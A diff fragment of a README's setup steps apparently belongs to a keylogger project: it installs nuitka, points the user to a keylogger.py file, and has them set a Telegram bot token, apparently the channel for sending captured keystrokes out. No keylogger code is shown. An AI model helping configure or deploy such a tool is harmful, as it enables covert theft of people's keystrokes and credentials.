@@ -37,7 +37,7 @@ pip install nuitka
 ## 📁 Setup
 
 1. Clone this repository or download the files.
-2. Open the `config.py` file and set:
+2. Open the `keylogger.py` file and set:
 
 ```python
 TELEGRAM_BOT_TOKEN = "your_bot_token"
